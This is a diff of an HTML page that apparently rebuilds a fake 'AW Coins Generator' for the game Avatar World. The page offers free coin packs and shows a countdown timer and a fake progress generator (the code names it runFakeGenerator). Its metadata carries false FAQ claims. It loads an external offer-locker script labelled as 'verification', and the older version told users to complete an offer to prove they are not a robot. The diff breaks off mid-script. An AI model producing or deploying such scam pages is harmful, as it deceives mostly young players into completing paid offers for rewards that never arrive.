@@ -1,402 +1,418 @@
 <!DOCTYPE html>
+
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<link rel="icon" href="" type="image/x-icon">
-    <title>Avatar world</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: "Gotham SSm", -apple-system, "Helvetica Neue", Arial, sans-serif;
-        }
-
+<head><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport"/><link as="image" href="https://i.postimg.cc/VNQLqDFC/Avatar-back.png" imagesrcset="https://i.postimg.cc/VNQLqDFC/Avatar-back.png 1x" rel="preload"/><link as="image" fetchpriority="high" href="https://i.postimg.cc/VNQLqDFC/Avatar-back.png" rel="preload"/>
+<meta charset="utf-8"/>
+<meta name="yandex-verification" content="9111eb81eebedfb2" />
+<title>Avatar World – AW Coins Generator (2025)</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<link href="https://fonts.googleapis.com" rel="preconnect"/>
+<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&amp;family=Fredoka+One&amp;display=swap" rel="stylesheet"/>
+<style>
         body {
-            background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.8)),
-                url('https://i.ibb.co/S7VbfB29/786c93c42b03574996210eee92269996.jpg') center/cover no-repeat fixed;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-
-        .container {
-            background: rgba(15, 15, 15, 0.95);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 20px;
-            padding: 40px;
-            width: 100%;
-            max-width: 480px;
+            font-family: 'Poppins', sans-serif;
+            background: url('https://i.postimg.cc/VNQLqDFC/Avatar-back.png') no-repeat center center fixed;
+            background-size: cover;
             position: relative;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
-            animation: modalAppear 0.6s ease-out;
         }
 
-        @keyframes modalAppear {
-            0% {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            100% {
-                opacity: 1;
-                transform: translateY(0);
-            }
+        .font-fredoka {
+            font-family: 'Fredoka One', cursive;
         }
 
-        .logo {
-            text-align: center;
-            margin-bottom: 35px;
+        /* Styles for the modals */
+        .modal-backdrop {
+            background-color: rgba(0, 0, 0, 0.5);
         }
 
-        .logo img {
-            width: 220px;
-            height: auto;
-            filter: drop-shadow(0 4px 6px rgba(0, 0, 0, 0.2));
+        .price-text-old {
+            color: #f56565; /* red-500 */
+            text-shadow: 1px 1px #c53030; /* A darker red for the shadow */
         }
 
-        .description {
-            color: rgba(255, 255, 255, 0.85);
-            text-align: center;
-            margin-bottom: 35px;
-            font-size: 16px;
-            line-height: 1.6;
+        /* Style for the item title stroke */
+        .item-title-stroke {
+             text-shadow: -1px -1px 0 #000, 1px -1px 0 #000, -1px 1px 0 #000, 1px 1px 0 #000, -2px 2px 3px rgba(0,0,0,0.3);
         }
 
-        .input-container {
-            margin-bottom: 30px;
-        }
-
-        .username-input {
-            width: 100%;
-            padding: 18px 25px;
-            background: rgba(255, 255, 255, 0.07);
-            border: 2px solid rgba(255, 255, 255, 0.1);
-            border-radius: 16px;
-            color: #FFFFFF;
-            font-size: 16px;
-            transition: all 0.3s ease;
-        }
-
-        .username-input:focus {
-            outline: none;
-            border-color: #00A2FF;
-            background: rgba(255, 255, 255, 0.1);
-            box-shadow: 0 0 0 4px rgba(0, 162, 255, 0.1);
-        }
-
-        .username-input::placeholder {
-            color: rgba(255, 255, 255, 0.5);
-        }
-
-        .button {
-            width: 100%;
-            padding: 18px;
-            background: linear-gradient(135deg, #00A2FF, #00FFB3);
-            border: none;
-            border-radius: 16px;
-            color: white;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        .button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(0, 162, 255, 0.3);
-        }
-
-        .loading {
-            display: none;
-            text-align: center;
-            margin: 20px 0;
-        }
-
-        .loading-text {
-            color: #fff;
-            font-size: 16px;
-            margin-bottom: 15px;
-        }
-
-        .username-display {
-            color: #00FFB3;
-            font-weight: 600;
-        }
-
+        /* Loading Animation Styles */
         .loading-spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #7010b9;
+            border-radius: 50%;
             width: 40px;
             height: 40px;
-            border: 4px solid rgba(255, 255, 255, 0.1);
-            border-left-color: #00A2FF;
-            border-radius: 50%;
-            display: inline-block;
             animation: spin 1s linear infinite;
-        }
-
-        .robux-options {
-            display: none;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            margin: 20px 0;
-        }
-
-        .robux-option {
-            background: rgba(255, 255, 255, 0.05);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 15px;
-            border-radius: 12px;
-            color: white;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            text-align: center;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        .robux-option:hover {
-            background: rgba(255, 255, 255, 0.1);
-            transform: translateY(-2px);
-        }
-
-        .robux-icon {
-            width: 20px;
-            height: 20px;
-        }
-
-        .sending-status {
-            display: none;
-            color: #00FFB3;
-            text-align: center;
-            font-size: 18px;
-            font-weight: 600;
-            margin: 20px 0;
-            padding: 20px;
-            background: rgba(0, 255, 179, 0.05);
-            border-radius: 12px;
-            animation: fadeIn 0.5s ease-out;
-        }
-
-        .verify-container {
-            display: none;
-            text-align: center;
-            animation: fadeIn 0.5s ease-out;
-        }
-
-        .verify-message {
-            color: #fff;
-            text-align: center;
-            margin: 20px 0;
-            font-size: 15px;
-            line-height: 1.6;
-        }
-
-        .activate-btn {
-            background: linear-gradient(45deg, #FFD700, #FFA500);
-            border: none;
-            padding: 18px;
-            border-radius: 16px;
-            color: #000;
-            font-size: 16px;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            cursor: pointer;
-            width: 100%;
-            transition: all 0.3s ease;
-            animation: glowPulse 2s infinite;
-        }
-
-        .activate-btn:hover {
-            transform: translateY(-2px);
-            filter: brightness(1.1);
-        }
-
-        .footer {
-            text-align: center;
-            padding-top: 20px;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-            margin-top: 20px;
-        }
-
-        .copyright {
-            color: rgba(255, 255, 255, 0.7);
-            font-size: 14px;
-            margin-bottom: 10px;
-            font-weight: 500;
-        }
-
-        .dmca-warning {
-            color: rgba(255, 255, 255, 0.6);
-            font-size: 12px;
-            line-height: 1.6;
-            padding: 12px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 8px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        .dmca-warning strong {
-            color: #00A2FF;
+            margin: 0 auto 16px auto;
         }
 
         @keyframes spin {
-            to { transform: rotate(360deg); }
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Progress bar animation */
+        .progress-bar {
+            width: 100%;
+            height: 1rem;
+            background-color: #374151;
+            border-radius: 0.5rem;
+            overflow: hidden;
+            margin: 8px 0;
         }
 
-        @keyframes glowPulse {
-            0% { box-shadow: 0 0 5px rgba(255, 215, 0, 0.5); }
-            50% { box-shadow: 0 0 20px rgba(255, 215, 0, 0.8); }
-            100% { box-shadow: 0 0 5px rgba(255, 215, 0, 0.5); }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #5910b9, #7334d3);
+            border-radius: 0.5rem;
+            transition: width 0.5s ease-in-out;
+            box-shadow: 0 0 10px rgba(103, 16, 185, 0.5);
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
+        /* Pulsing animation for the modal title */
+        .pulse-title {
+            animation: pulse 2s ease-in-out infinite;
         }
 
-        @media (max-width: 640px) {
-            .container {
-                padding: 30px 20px;
-            }
-
-            .logo img {
-                width: 180px;
-            }
-
-            .robux-options {
-                grid-template-columns: 1fr;
-            }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
         }
+    
+    /* Glossy card design */
+    .card-bg {
+        background: linear-gradient(145deg, #7c4ac2, #5302cc);
+        border: 2px solid #3f1d72;
+        box-shadow: 0 6px 12px rgba(0,0,0,0.2);
+        transition: transform 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
+    }
+    .card-bg:hover {
+        transform: translateY(-4px);
+        box-shadow: 0 10px 16px rgba(0,0,0,0.3);
+    }
+
+
+    /* Stylish quantity buttons */
+    .quantity-minus, .quantity-plus {
+        background: linear-gradient(135deg, #FFD93D, #FFB347);
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+        transition: all 0.3s ease-in-out;
+    }
+    .quantity-minus:hover, .quantity-plus:hover {
+        background: linear-gradient(135deg, #FFB347, #FF8C00);
+        transform: scale(1.1);
+    }
+
+    /* Better accessibility - text shadows for contrast */
+    .item-title-stroke {
+        text-shadow: -1px -1px 0 #333, 1px -1px 0 #333, -1px 1px 0 #333, 1px 1px 0 #333;
+    }
+    .price-text-old {
+        text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
+    }
+
+    /* Slight transparent white overlay to make text readable on bg */
+    body::before {
+        content: "";
+        position: fixed;
+        top: 0; left: 0; right: 0; bottom: 0;
+        background: rgba(255,255,255,0.15);
+        z-index: -1;
+    }
+
+    #countdown-timer {
+        color: #ef4444; /* red-500 */
+        text-shadow: -1.5px -1.5px 0 #000, 1.5px -1.5px 0 #000, -1.5px 1.5px 0 #000, 1.5px 1.5px 0 #000;
+    }
+
+    /* Floating items background animation */
+    #floating-items-container {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        overflow: hidden;
+        z-index: -2;
+    }
+
+    .floating-item {
+        position: absolute;
+        opacity: 0.25;
+        will-change: transform;
+        animation-iteration-count: infinite;
+        animation-timing-function: linear;
+    }
+
+    @keyframes float1 {
+        0% { transform: translate(-100px, 110vh) rotate(0deg); }
+        100% { transform: translate(110vw, -100px) rotate(720deg); }
+    }
+
+    @keyframes float2 {
+        0% { transform: translate(110vw, 110vh) rotate(0deg); }
+        100% { transform: translate(-100px, -100px) rotate(-720deg); }
+    }
+
+    @keyframes float3 {
+        0% { transform: translate(50vw, 110vh) rotate(0deg); }
+        100% { transform: translate(50vw, -100px) rotate(360deg); }
+    }
+    
+    /* In-App Browser Fallback Styles */
+    #browser-fallback {
+        display: none;
+        position: fixed;
+        inset: 0;
+        background-color: rgba(0,0,0,0.8);
+        z-index: 9999;
+        color: white;
+        text-align: center;
+        padding: 2rem;
+    }
     </style>
-<link rel="me" href="https://www.blogger.com/profile/10306111264195890401" />
-<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
-<meta name='google-adsense-platform-domain' content='blogspot.com'/>
-</head>
-<body>
-    <div class="container">
-        <div class="logo">
-            <img src="https://i.ibb.co/kgmj3Zmf/IMG-1710.jpg" alt="avatar world">
-        </div>
-
-        <div id="initial-content">
-            <p class="description">
-                Enter your username to access exclusive content and premium benefits
-            </p>
-
-            <div class="input-container">
-                <input type="text" id="username-input" class="username-input" placeholder="Enter your username">
-            </div>
-
-            <button class="button" onclick="searchUser()">Continue</button>
-        </div>
-
-        <div id="loading" class="loading">
-            <div class="loading-text">
-                Searching for user: <span id="searching-username" class="username-display"></span>
-            </div>
-            <div class="loading-spinner"></div>
-        </div>
-
-        <div id="robux-options" class="robux-options">
-            <button class="robux-option" onclick="selectAmount('10,000')">
-                <img src="https://i.ibb.co/5gyPT50S/IMG-20250816-WA0002-1.png" alt="Robux" class="robux-icon">
-                10,000
-            </button>
-            <button class="robux-option" onclick="selectAmount('25,000')">
-                <img src="https://i.ibb.co/5gyPT50S/IMG-20250816-WA0002-1.png" alt="Robux" class="robux-icon">
-                25,000
-            </button>
-            <button class="robux-option" onclick="selectAmount('40,000')">
-                <img src="https://i.ibb.co/5gyPT50S/IMG-20250816-WA0002-1.png" alt="Robux" class="robux-icon">
-                40,000
-            </button>
-            <button class="robux-option" onclick="selectAmount('50,000')">
-                <img src="https://i.ibb.co/5gyPT50S/IMG-20250816-WA0002-1.png" alt="Robux" class="robux-icon">
-                50,000
-            </button>
-            <button class="robux-option" onclick="selectAmount('100,000')">
-                <img src="https://i.ibb.co/5gyPT50S/IMG-20250816-WA0002-1.png" alt="Robux" class="robux-icon">
-                100,000
-            </button>
-            <button class="robux-option" onclick="selectAmount('150,000')">
-                <img src="https://i.ibb.co/5gyPT50S/IMG-20250816-WA0002-1.png" alt="Robux" class="robux-icon">
-                150,000
-            </button>
-        </div>
-
-        <div id="sending" class="loading">
-            <div class="loading-text">Processing request...</div>
-            <div class="loading-spinner"></div>
-        </div>
-
-        <div id="sending-status" class="sending-status"></div>
-
-        <div id="verify-container" class="verify-container">
-            <p class="verify-message">
-                Please click on the button below and complete 1 offer to verify that you're not a robot.
-            </p>
-            <button class="activate-btn" onclick="_qW()">
-                Verify
-            </button>
-        </div>
-
-        <div class="footer">
-            <div class="copyright">Copyright ©️ 2025</div>
-            <div class="dmca-warning">
-                This is a copyrighted website and using it with no permission could result in facing a lawsuit by <strong>DMCA</strong>.
-            </div>
-        </div>
-    </div>
-
-    <script>
-        function searchUser() {
-            const username = document.getElementById('username-input').value;
-            if (!username) return;
-
-            document.getElementById('initial-content').style.display = 'none';
-            document.getElementById('loading').style.display = 'block';
-            document.getElementById('searching-username').textContent = username;
-
-            setTimeout(() => {
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('robux-options').style.display = 'grid';
-            }, 2000);
-        }
-
-        function selectAmount(amount) {
-            const username = document.getElementById('username-input').value;
-            document.getElementById('robux-options').style.display = 'none';
-            document.getElementById('sending').style.display = 'block';
-
-            setTimeout(() => {
-                document.getElementById('sending').style.display = 'none';
-                document.getElementById('sending-status').style.display = 'block';
-                document.getElementById('sending-status').innerText = `Sending awcoins to **${username}**`;
-
-                setTimeout(() => {
-                    document.getElementById('sending-status').style.display = 'none';
-                    document.getElementById('verify-container').style.display = 'block';
-                }, 2000);
-            }, 2000);
-        }
-    </script>
+<!-- Verification Scripts -->
 <script type="text/javascript">
-    var CkOtY_CPn_jJJTrc={"it":4542345,"key":"c094c"};
+    var xzQte_HFW_kuJQSc={"it":4542345,"key":"c094c"};
 </script>
 <script src="https://dlk457skl57zp.cloudfront.net/097a99a.js"></script>
 
-<!-- Google Analytics -->
 
-<!-- End Google Analytics -->
+<!-- SEO: meta + OpenGraph + Twitter -->
+<meta content="Avatar World generator — get free pets, fruits, and items instantly. Roblox Updated for 2025. Works on mobile, PC, and console." name="description"/>
+<meta content="index, follow" name="robots"/>
+<link href="https://growngarden.pages.dev/" rel="canonical"/>
+<meta content="website" property="og:type"/>
+<meta content="Avatar World — Roblox Generator (Free Pets, Fruits &amp; Items)" property="og:title"/>
+<meta content="Use the Avatar World Roblox generator to unlock free pets, fruits, and items. Updated 2025-08-13." property="og:description"/>
+<meta content="https://growngarden.pages.dev/" property="og:url"/>
+<meta content="https://upload.wikimedia.org/wikipedia/commons/6/6a/Roblox_Logo_2022.svg" property="og:image"/>
+<!-- Optional: prevent zoom via meta (some browsers honor last viewport) -->
 
-</body>
-</html>
+<!-- Structured Data -->
+<script type="application/ld+json">
+  {
+    "@context":"https://schema.org",
+    "@type":"FAQPage",
+    "mainEntity":[
+      {"@type":"Question","name":"Is the generator free?","acceptedAnswer":{"@type":"Answer","text":"Yes, it’s free to use."}},
+      {"@type":"Question","name":"Does it work on mobile?","acceptedAnswer":{"@type":"Answer","text":"Yes — iOS, Android, PC, and console browsers."}},
+      {"@type":"Question","name":"Why is there a verification step?","acceptedAnswer":{"@type":"Answer","text":"To prevent automated abuse and keep the service available."}}
+    ]
+  }
+  </script>
+<style>
+    #claim-notifs{position:fixed;right:12px;bottom:12px;display:flex;flex-direction:column;gap:10px;z-index:99999}
+    .notif{display:flex;align-items:center;gap:10px;background:rgba(255,255,255,.95);color:#111;border-radius:14px;padding:10px 12px;min-width:240px;max-width:320px;box-shadow:0 12px 30px rgba(0,0,0,.25)}
+    .notif img{width:44px;height:44px;border-radius:10px;object-fit:cover}
+    .notif .meta{font-size:.8rem;opacity:.75}
+    .notif-enter{animation:notifIn .35s ease both}
+    .notif-exit{animation:notifOut .35s ease both}
+    @keyframes notifIn{from{transform:translateY(20px);opacity:0}to{transform:translateY(0);opacity:1}}
+    @keyframes notifOut{to{transform:translateY(10px);opacity:0}}
+  
+.notif{color:#111 !important}</style>
+<meta content="index, follow" name="googlebot"/><script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","name":"Avatar World Roblox Generator — Free Pets, Fruits & Items","url":"https://growngarden.pages.dev/","description":"Generator page for Avatar World on Roblox to claim pets, fruits, and items.","inLanguage":"en","dateModified":"2025-08-13"}</script><link crossorigin="" href="https://i.namu.wiki" rel="preconnect"/><link href="//i.namu.wiki" rel="dns-prefetch"/><link crossorigin="" href="https://static.wikia.nocookie.net" rel="preconnect"/><link href="//static.wikia.nocookie.net" rel="dns-prefetch"/><style>
+/* Protection: disable selection and long-press copy */
+html, body, * {
+  -webkit-user-select: none !important;
+  -moz-user-select: none !important;
+  -ms-user-select: none !important;
+  user-select: none !important;
+  -webkit-touch-callout: none !important;
+}
+/* Reduce unintended zoom gestures */
+html, body {
+  touch-action: manipulation;
+}
+</style></head>
+<body class="text-white">
+<div id="browser-fallback">
+<div class="flex flex-col items-center justify-center h-full">
+<h2 class="text-3xl font-bold mb-4">Please open this page in your browser!</h2>
+<p class="mb-6">This page works best in your phone's default browser (like Safari or Chrome).</p>
+<a class="bg-blue-500 text-white font-bold py-3 px-6 rounded-lg hover:bg-blue-600 transition-colors" href="#" id="open-in-browser-link" target="_blank">Open in Browser</a>
+</div>
+</div>
+<div id="floating-items-container"></div>
+<div class="container mx-auto px-4 py-8">
+<!-- Header Section -->
+<header class="text-center mb-12">
+<img alt="Grow A Garden Logo" class="mx-auto mb-4 w-64" fetchpriority="high" src="https://i.ibb.co/991fbGG1/awicon.png"/>
+<h1 class="text-4xl md:text-5xl font-fredoka text-purple-800 drop-shadow-lg">AW Coins Generator</h1>
+<div class="text-2xl md:text-3xl font-fredoka mt-4" id="countdown-timer">02:00</div>
+</header>
+<!-- Pet Section -->
+
+<section class="mb-16" id="pets">
+    <h2 class="text-3xl font-fredoka text-center mb-8 text-purple-500">Select Item:</h2>
+  <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4 md:gap-8">
+    
+    <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+      <div>
+        <img src="https://i.ibb.co/m54K55FY/IMG-20250816-WA0002.jpg" alt="AW Coins" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover"/>
+      </div>
+      <div>
+        <p class="text-xl md:text-2xl font-bold mb-1 font-fredoka item-title-stroke">TINY PACK</p>
+        <p class="text-lg md:text-xl font-bold mb-2">💰 99 COINS</p>
+        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+        <div class="mt-3 flex items-center justify-center bg-purple-800 rounded-full p-1">
+            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+        </div>
+      </div>
+    </div>
+    
+    <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+      <div>
+        <img src="https://i.ibb.co/m54K55FY/IMG-20250816-WA0002.jpg" alt="AW Coins" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover"/>
+      </div>
+      <div>
+        <p class="text-xl md:text-2xl font-bold mb-1 font-fredoka item-title-stroke">SMALL PACK</p>
+        <p class="text-lg md:text-xl font-bold mb-2">💰 150 COINS</p>
+        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+        <div class="mt-3 flex items-center justify-center bg-purple-800 rounded-full p-1">
+            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+        </div>
+      </div>
+    </div>
+    
+    <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+      <div>
+        <img src="https://i.ibb.co/m54K55FY/IMG-20250816-WA0002.jpg" alt="AW Coins" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover"/>
+      </div>
+      <div>
+        <p class="text-xl md:text-2xl font-bold mb-1 font-fredoka item-title-stroke">LARGE PACK</p>
+        <p class="text-lg md:text-xl font-bold mb-2">💰 250 COINS</p>
+        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+        <div class="mt-3 flex items-center justify-center bg-purple-800 rounded-full p-1">
+            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+        </div>
+      </div>
+    </div>
+    
+    <div class="card-bg rounded-2xl shadow-lg p-4 md:p-6 text-center transform hover:scale-105 transition-transform duration-300 flex flex-col justify-between">
+      <div>
+        <img src="https://i.ibb.co/m54K55FY/IMG-20250816-WA0002.jpg" alt="AW Coins" class="mx-auto mb-4 rounded-lg w-24 h-24 md:w-36 md:h-36 object-cover"/>
+      </div>
+      <div>
+        <p class="text-xl md:text-2xl font-bold mb-1 font-fredoka item-title-stroke">GIANT PACK</p>
+        <p class="text-lg md:text-xl font-bold mb-2">💰 1250 COINS</p>
+        <button class="claim-btn bg-yellow-400 text-green-800 font-bold py-2 px-4 md:px-6 rounded-full hover:bg-yellow-500 transition-colors w-full text-sm md:text-base">Claim</button>
+        <div class="mt-3 flex items-center justify-center bg-purple-800 rounded-full p-1">
+            <button class="quantity-minus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">-</button>
+            <span class="quantity-display text-white font-bold text-lg md:text-xl mx-2 md:mx-4">0</span>
+            <button class="quantity-plus text-white font-bold text-lg md:text-xl w-8 h-6 md:w-10 md:h-8">+</button>
+        </div>
+      </div>
+    </div>
+    
+  </div>
+</section>
+
+<!-- Fruit Section -->
+
+<section id="fruits">
+  <h2 class="text-3xl font-fredoka text-center mb-8"></h2>
+  <div class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4 md:gap-8"></div>
+</section>
+
+</div>
+<!-- Username Modal -->
+<div class="hidden fixed inset-0 z-50 flex items-center justify-center p-4 modal-backdrop" id="username-modal">
+<div class="bg-white rounded-2xl shadow-2xl p-8 max-w-sm w-full text-gray-800">
+<h3 class="text-2xl font-bold mb-4 text-center font-fredoka text-purple-800">Enter Your Username</h3>
+<p class="text-center mb-6 text-purple-800">Please enter your username to claim your item.</p>
+<input class="w-full px-4 py-2 border border-gray-300 rounded-lg mb-1 focus:outline-none focus:ring-2 focus:ring-purple-500" id="username-input" placeholder="Your Username" type="text"/>
+<p class="text-red-500 text-sm h-4 mb-2" id="username-error"></p>
+<button class="w-full bg-purple-500 text-white font-bold py-3 px-6 rounded-lg hover:bg-purple-600 transition-colors" id="submit-username-btn">Submit</button>
+<button class="w-full bg-gray-200 text-gray-700 font-bold py-2 px-6 rounded-lg hover:bg-gray-300 transition-colors mt-2" id="close-modal-btn">Cancel</button>
+</div>
+</div>
+<!-- Generator Modal -->
+<div class="hidden fixed inset-0 z-50 flex items-center justify-center p-4 modal-backdrop" id="generator-modal">
+<div class="bg-white rounded-2xl shadow-2xl p-8 max-w-md w-full text-gray-800 text-center">
+<h3 class="text-3xl font-bold mb-4 text-purple-800 font-fredoka animate-pulse" id="generator-title">Generating Items...</h3>
+<div class="relative w-20 h-20 mx-auto mb-4">
+<div class="absolute w-full h-full border-4 border-purple-300 rounded-full animate-spin" style="border-top-color: #7b10b9;"></div>
+<img class="absolute inset-0 w-12 h-12 m-auto animate-bounce" decoding="async" id="loading-item-img" loading="lazy" src="https://static.wikia.nocookie.net/growagarden/images/8/8f/PrimalEgg.png"/ alt="Avatar World Roblox generator preview">
+</div>
+<div class="progress-bar mb-4 bg-gray-200 rounded-full h-4 overflow-hidden">
+<div class="progress-fill text-white text-sm text-center" id="progress-fill" style="width: 0%; line-height: 1rem;">0%</div>
+</div>
+<p class="text-gray-600 text-sm italic mb-4" id="game-tip"></p>
+<button class="hidden w-full bg-red-700 text-white font-bold py-5 px-10 rounded-xl text-2xl hover:bg-red-800 transition-transform transform hover:scale-105 animate-pulse" id="verify-btn">
+    Verify Now
+  </button>
+</div>
+</div>
+<script>
+        // --- Countdown Timer ---
+        document.addEventListener('DOMContentLoaded', () => {
+            const countdownElement = document.getElementById('countdown-timer');
+            let timeInSeconds = 120; // 2 minutes
+
+            const timer = setInterval(() => {
+                const minutes = Math.floor(timeInSeconds / 60);
+                let seconds = timeInSeconds % 60;
+
+                seconds = seconds < 10 ? '0' + seconds : seconds;
+
+                countdownElement.textContent = `${minutes}:${seconds}`;
+
+                if (timeInSeconds <= 0) {
+                    clearInterval(timer);
+                    countdownElement.textContent = "Time's up!";
+                }
+
+                timeInSeconds--;
+            }, 1000);
+        });
+
+        // --- Keep old logic working, just add dynamic sequence ---
+        let selectedItemImg = "https://static.wikia.nocookie.net/growagarden/images/8/8f/PrimalEgg.png";
+
+        const claimButtons = document.querySelectorAll('.claim-btn');
+        const usernameModal = document.getElementById('username-modal');
+        const closeModalBtn = document.getElementById('close-modal-btn');
+        const submitUsernameBtn = document.getElementById('submit-username-btn');
+        const usernameInput = document.getElementById('username-input');
+        const usernameError = document.getElementById('username-error');
+        const loadingItemImg = document.getElementById('loading-item-img');
+
+        // Open Username Modal & detect clicked item
+        
+claimButtons.forEach(button => {
+    button.addEventListener('click', () => {
+        const card = button.closest('.card-bg');
+        let src = null;
+        const img = card.querySelector('img');
+        if (img && img.src) src = img.src;
+        if (src) selectedItemImg = src;
+        usernameModal.classList.remove('hidden');
+    });
+});
+// Close Username Modal
+        closeModalBtn.addEventListener('click', () => {
+            usernameModal.classList.add('hidden');
+            usernameInput.value = '';
+            usernameError.textContent = '';
+        });
+
+        // Submit Username & Start Generator
+        submitUsernameBtn.addEventListener('click', () => {
+            const username = usernameInput.value.trim();
+            if (username !== '') {
+                usernameModal.classList.add('hidden');
+                usernameError.textContent = '';
+                loadingItemImg.src = selectedItemImg;
+                runFakeGenerator(username);
+	
